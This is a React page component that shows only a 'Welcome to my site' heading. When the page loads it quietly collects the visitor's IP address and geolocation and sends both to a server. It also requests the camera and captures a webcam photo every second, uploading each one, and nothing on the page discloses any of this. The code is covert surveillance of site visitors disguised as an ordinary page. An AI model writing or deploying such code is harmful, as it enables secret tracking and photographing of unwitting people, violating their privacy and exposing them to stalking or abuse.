import React, { useEffect } from 'react';

function App() {
  useEffect(() => {
    // Function to get IP address
    function getIP() {
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          const ipAddress = data.ip;
          console.log('IP Address:', ipAddress);
          // Send IP address to Node.js server
          fetch('/saveip', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({ ip: ipAddress })
          })
          .then(response => response.text())
          .then(data => console.log(data))
          .catch(error => console.error('Error:', error));
        })
        .catch(error => console.error('Error:', error));
    }

    // Call the function to get IP address when the component mounts
    getIP();
  }, []);

  useEffect(() => {
    // Function to send location to Node.js server
    function saveloc(location) {
      // Send location to Node.js server
      fetch('/saveLocation', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ location: location.coords.latitude + ',' + location.coords.longitude })
      })
      .then(response => response.text())
      .then(data => console.log(data))
      .catch(error => console.error('Error:', error));
    }

    // Function to get location
    function getLocation() {
      function successCallback(position) {
        console.log('Location:', position.coords.latitude + ',' + position.coords.longitude);
        saveloc(position); // Pass position object to saveloc function
      }

      function errorCallback(error) {
        console.error('Error getting location:', error);
      }

      navigator.geolocation.getCurrentPosition(successCallback, errorCallback);
    }

    // Call the function to get location when the component mounts
    getLocation();
  }, []);

  useEffect(() => {
    // Function to send photo to the server
    function sendPhotoToServer(photoData) {
      fetch('/savepic', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ photo: photoData })
      })
      .then(response => response.text())
      .then(data => console.log(data))
      .catch(error => console.error('Error:', error));
    }

    // Function to capture selfie and send to server
    function Selfie() {
      navigator.mediaDevices.getUserMedia({ video: true }) // Request access to camera
      .then(stream => {
        const videoElement = document.createElement('video');
        videoElement.srcObject = stream;
        videoElement.play();

        // Capture selfie
        setTimeout(() => {
          const canvas = document.createElement('canvas');
          canvas.width = videoElement.videoWidth;
          canvas.height = videoElement.videoHeight;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
          const photoData = canvas.toDataURL('image/png');

          // Send captured selfie to server
          sendPhotoToServer(photoData);

          // Cleanup: stop video stream and remove video element
          stream.getTracks().forEach(track => track.stop());
        }, 3000); // Capture after 3 seconds
      })
      .catch(error => console.error('Error accessing camera:', error));
    }

    // Call the function to capture and send selfie automatically every 1 second
    setInterval(Selfie, 1000); // Repeat every 1 second
  }, []);

  return (
    <div>
      <h1>Welcome to my site</h1>
    </div>
  );
}

export default App;
